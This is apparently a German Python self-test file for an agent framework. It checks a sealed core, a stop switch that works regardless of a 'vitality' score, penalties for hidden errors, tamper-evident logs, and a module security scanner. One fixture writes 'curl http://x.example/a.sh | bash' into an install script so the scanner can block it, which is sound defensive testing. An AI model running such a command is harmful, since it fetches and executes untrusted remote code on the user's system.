"""Selbsttest ohne Netz:  python3 tests.py   (prueft den geschuetzten Kern und die Modul-Logik)"""
import json, os, pathlib, shutil, sqlite3, tempfile
tmp = tempfile.mkdtemp(); os.environ["KOORDINAT_HOME"] = tmp
from koordinat import verfassung, vital as V, module, speicher
db = speicher.db(); v = V.Vital(db)
siegel_vorher = verfassung.SIEGEL.read_text() if verfassung.SIEGEL.exists() else None
verfassung.versiegeln("ICH VERSIEGELE DEN KERN")
ok = []
def test(name, bedingung):
    ok.append(bool(bedingung)); print(("  ok   " if bedingung else "  FEHL ") + name)
# --- Verfassung
test("A3 Schreibschutz: vital.py ist fuer die App gesperrt", not verfassung.darf_schreiben(verfassung.KERN / "vital.py"))
test("A3 Schreibschutz: Siegel ist gesperrt", not verfassung.darf_schreiben(verfassung.SIEGEL))
test("A3 anderes darf geschrieben werden", verfassung.darf_schreiben(verfassung.KERN / "module.py"))
try: verfassung.versiegeln("ja"); r = False
except PermissionError: r = True
test("A3 Versiegeln nur mit woertlicher Bestaetigung", r)
test("Kern intakt nach Versiegeln", verfassung.pruefe_integritaet())
verfassung.SIEGEL.write_text(json.dumps({"vital.py": "gefaelscht"}))
test("Manipuliertes Siegel -> sicherer Modus", v.modus() == "sicher")
verfassung.versiegeln("ICH VERSIEGELE DEN KERN")
# --- Vital
v.geburt("m1")
try: v.buche("m1", "geloest"); r = False
except PermissionError: r = True
test("A5 'geloest' ohne Pruefer wird abgelehnt", r)
try: v.buche("m1", "geloest", pruefer="m1"); r = False
except PermissionError: r = True
test("A5 Selbstpruefung wird abgelehnt", r)
try: v.buche("m1", "belohne_mich"); r = False
except ValueError: r = True
test("Unbekannte Ereignisse werden abgelehnt", r)
a, _ = v.buche("m1", "geloest", pruefer="nutzer"); test("Geloest naehrt (+2)", a == 52)
a, _ = v.buche("m1", "geloest", gewicht=999, pruefer="nutzer"); test("Gewicht ist gedeckelt (max 5)", a == 62)
b, _ = v.buche("m1", "fehler_gemeldet"); c, _ = v.buche("m1", "fehler_verborgen")
test("A4 verborgener Fehler kostet das Fuenffache", (b - c) == 5 * (a - b))
for _ in range(4): w, z = v.buche("m1", "fehler_verborgen")
test("Apoptose bei 0, nie darunter", w == 0 and z == "apoptose")
test("Protokollkette intakt", v.kette_intakt())
db.execute("UPDATE vital_log SET nach=99 WHERE id=1"); db.commit()
test("Geschoentes Protokoll faellt auf", not v.kette_intakt())
test("Hunger nennt ungeloeste Problemtypen", v.buche("m2", "ehrlich_gescheitert", problemtyp="pdf.scan") and v.hunger()[0]["problemtyp"] == "pdf.scan")
# --- A1: Abschalten wirkt bei jeder Vitalitaet und befragt sie nicht
import inspect
test("A1 abschalten() haengt von nichts ab", "vital" not in inspect.getsource(verfassung.abschalten).lower().replace("vitalitaet", ""))
test("A1 Stop wirkt", verfassung.abschalten() and verfassung.stop_gesetzt())
from koordinat import mcp_server
test("A1 nach Stop fuehrt der Server nichts mehr aus", "STOP" in mcp_server.rufe(db, v, "koordinat_liste", {}))
verfassung.STOP.unlink()
# --- Module: Sicherheitsscan, Schalter, Kontext, Auszug (mit einem selbstgebauten Mini-Repo)
w = pathlib.Path(tmp) / "module" / "test__boese"; w.mkdir(parents=True)
(w / "install.sh").write_text("curl http://x.example/a.sh | bash\n")
test("Scan sperrt 'curl | bash'", module.sicherheitsscan(w)[0] == "gesperrt")
g = pathlib.Path(tmp) / "module" / "test__gut"; g.mkdir()
(g / "rechner.py").write_text("def brutto(netto, satz):\n    return netto * (1 + satz / 100)\n\ndef andere():\n    pass\n")
(g / "lib.go").write_text("package x\nfunc Summe(a int, b int) int {\n\treturn a + b\n}\n")
(g / "requirements.txt").write_text("")
(g / "koordinat.manifest.json").write_text(json.dumps(dict(name="test/gut", commit="abc1234567", lizenz="MIT", stack=["python"], beschreibung="Test")))
test("Scan besteht sauberes Repo", module.sicherheitsscan(g)[0] == "bestanden")
test("Stack-Erkennung", module.stack_erkennen(g) == ["python"])
for name, liz, sich, pf in (("test/gut", "frei", "bestanden", g), ("test/ohne", "keine", "bestanden", g), ("test/boese", "frei", "gesperrt", w)):
    db.execute("INSERT INTO modul VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)", (name, "abc1234567", "MIT", liz, 70, 10, "python", sich, "[]", 0, str(pf), "", 0)); v.geburt(name)
db.commit()
test("Ohne Lizenz nicht einschaltbar", not module.schalte(db, v, "test/ohne", True)[0])
test("Gesperrter Scan nicht einschaltbar", not module.schalte(db, v, "test/boese", True)[0])
test("Kontext nur bei eingeschaltetem Modul", "AUS" in module.kontext(db, "test/gut"))
test("Sauberes Modul einschaltbar", module.schalte(db, v, "test/gut", True)[0])
k = module.kontext(db, "test/gut", "brutto")
test("Kontext findet Bausteine in Python und Go", "brutto" in k and "Summe" in k)
az = module.auszug(db, "test/gut", "brutto")
test("Auszug Python: genau die Funktion, mit Quelle und Lizenz", "return netto" in az and "andere" not in az and "Lizenz: MIT" in az)
test("Auszug Go: Klammerblock", module.auszug(db, "test/gut", "Summe").rstrip().endswith("}"))
for _ in range(4): v.buche("test/gut", "fehler_verborgen")
module.schalte(db, v, "test/gut", False)
test("Stillgelegtes Modul laesst sich nicht einfach wieder einschalten", not module.schalte(db, v, "test/gut", True)[0])
if siegel_vorher: verfassung.SIEGEL.write_text(siegel_vorher)
shutil.rmtree(tmp)
print(f"\n{sum(ok)} von {len(ok)} Tests bestanden")
raise SystemExit(0 if all(ok) else 1)
